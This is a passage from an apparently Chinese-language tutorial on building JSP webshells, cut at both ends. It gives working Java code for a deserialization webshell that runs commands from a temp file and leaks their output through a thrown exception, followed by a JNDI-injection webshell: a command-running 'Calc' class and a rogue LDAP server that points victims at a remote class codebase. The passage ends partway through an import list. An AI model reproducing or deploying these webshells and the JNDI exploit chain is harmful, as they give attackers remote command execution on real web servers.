    import java.io.IOException;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.io.Serializable;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.Base64;
    /**
     * @author threedr3am
     */
    public class Threedr3am_12 implements Serializable {
      private static final long serialVersionUID = 1L;
      private void  readObject(ObjectInputStream is) throws Throwable {
        StringBuilder stringBuilder = new StringBuilder();
        try {
          String tmp = System.getProperty("java.io.tmpdir");
          String cmd = new String(Files.readAllBytes(Paths.get(tmp + File.separator + "CMD")));
          InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
          BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
          String line;
          while((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
          }
        } catch (Throwable e) {
          e.printStackTrace();
        }
        throw new Throwable(stringBuilder.toString());
      }
      public static void main(String[] args) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(new Threedr3am_12());
        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
      }
    }
只要把这个class文件base64一下，放到jsp马就ok了，理论上这个马挺不错的，如果不禁用Class.forName、URLClassLoader、readObject，那因为可以随意引入jar或者class，那么也就是说可以无限拓展了，比如我可以引入common-collections，也能自己写个jar等等。
### 十三、使用JdbcRowSetImpl进行jndi注入的JSP Webshell
很多人说jndi有版本限制，其实只要把com.sun.jndi.ldap.object.trustURLCodebase设置为true就没有任何限制。
jndi的利用手法不用我说了吧？算了，还是贴点代码吧。
Calc.java:
    import java.io.BufferedReader;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    /**
     * @author LaoHai
     */
    public class Calc {
      static {
        StringBuilder stringBuilder = new StringBuilder();
        try {
          String cmd = "whoami";
          InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
          BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
          String line;
          while((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
          }
        } catch (Throwable e) {
          e.printStackTrace();
        }
        Integer.parseInt(stringBuilder.toString());
      }
      public static void main(String[] args) {
      }
    }
LdapServer.java:
    import com.unboundid.ldap.listener.InMemoryDirectoryServer;
    import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
    import com.unboundid.ldap.listener.InMemoryListenerConfig;
    import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
    import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
    import com.unboundid.ldap.sdk.Entry;
    import com.unboundid.ldap.sdk.LDAPException;
    import com.unboundid.ldap.sdk.LDAPResult;
    import com.unboundid.ldap.sdk.ResultCode;
    import com.unboundid.util.Base64;
    import java.net.InetAddress;
    import java.net.MalformedURLException;
    import java.net.URL;
    import java.text.ParseException;
    import javax.net.ServerSocketFactory;
    import javax.net.SocketFactory;
    import javax.net.ssl.SSLSocketFactory;
    /**
     * LDAP server
     *
     * @author threedr3am
     */
    public class LdapServer {
      private static final String LDAP_BASE = "dc=example,dc=com";
      public static byte[] classData;
      public static void main(String[] args) {
        run(args);
      }
      public static void run(String[] args) {
        int port = args.length > 0 ? Integer.parseInt(args[0]) : 43658;
        //TODO 把resources下的Calc.class 或者 自定义修改编译后target目录下的Calc.class 拷贝到下面代码所示http://host:port的web服务器根目录即可
        String url = args.length > 0 ? args[1] : "http://localhost/#Calc";
        try {
          InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
          config.setListenerConfigs(new InMemoryListenerConfig(
              "listen", //$NON-NLS-1$
              InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
              port,
              ServerSocketFactory.getDefault(),
              SocketFactory.getDefault(),
              (SSLSocketFactory) SSLSocketFactory.getDefault()));
          config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
          InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
          System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
          ds.startListening();
        } catch (Exception e) {
          e.printStackTrace();
        }
      }
    }
OperationInterceptor.java:
    import com.unboundid.ldap.listener.InMemoryDirectoryServer;
    import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
    import com.unboundid.ldap.listener.InMemoryListenerConfig;
    import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
    import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
    import com.unboundid.ldap.sdk.Entry;
    import com.unboundid.ldap.sdk.LDAPException;
    import com.unboundid.ldap.sdk.LDAPResult;
    import com.unboundid.ldap.sdk.ResultCode;
    import com.unboundid.util.Base64;
    import java.net.InetAddress;
    import java.net.MalformedURLException;
    import java.net.URL;
    import java.text.ParseException;
    import javax.net.ServerSocketFactory;
    import javax.net.SocketFactory;